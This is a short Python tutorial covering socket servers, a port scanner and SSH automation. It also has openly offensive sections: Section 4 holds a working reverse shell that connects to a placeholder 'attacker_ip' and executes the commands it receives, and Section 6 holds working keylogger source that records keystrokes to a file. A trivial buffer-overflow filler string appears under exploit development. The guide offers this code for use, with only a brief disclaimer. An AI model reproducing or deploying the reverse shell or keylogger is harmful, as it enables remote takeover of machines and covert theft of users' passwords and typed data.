### Python for Networking, Automation, and Exploits

#### 1. Introduction
Python is a powerful language for networking, automation, and penetration testing. It is widely used in cybersecurity for tasks such as network scanning, reverse shells, exploit development, and malware creation.

---

### 2. Networking with Python

#### 2.1 Socket Programming Basics
```python
import socket

host = '127.0.0.1'
port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)

print(f'Listening on {host}:{port}')
while True:
    client, addr = s.accept()
    print(f'Connection from {addr}')
    client.send(b'Hello, you are connected!')
    client.close()
```

#### 2.2 Simple Port Scanner
```python
import socket

def port_scan(target, ports):
    for port in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        if result == 0:
            print(f'Port {port} is open')
        s.close()

port_scan('127.0.0.1', [21, 22, 80, 443, 8080])
```

---

### 3. Automation with Python

#### 3.1 Automating SSH Connections
```python
import paramiko

host = "192.168.1.1"
username = "user"
password = "password"

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(host, username=username, password=password)
stdin, stdout, stderr = client.exec_command("ls -l")
print(stdout.read().decode())
client.close()
```

---

### 4. Reverse Shells

#### 4.1 Simple Reverse Shell
```python
import socket
import subprocess

host = "attacker_ip"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

while True:
    command = s.recv(1024).decode()
    if command.lower() == "exit":
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)

s.close()
```

---

### 5. Exploit Development

#### 5.1 Buffer Overflow Example
```python
buffer = "A" * 1000  # Adjust length based on target vulnerability
print(buffer)
```

---

### 6. Malware Development (Ethical Usage Only)

#### 6.1 Keylogger
```python
from pynput.keyboard import Listener

def log_keystrokes(key):
    with open("log.txt", "a") as file:
        file.write(str(key) + "\n")

with Listener(on_press=log_keystrokes) as listener:
    listener.join()
```

---

### 7. Conclusion
Python is a versatile tool for ethical hacking, networking, and automation. Use these scripts responsibly for educational and security purposes.

**Disclaimer:** This guide is for educational purposes only. Unauthorized use of these scripts may be illegal.

---

*Happy Hacking!*
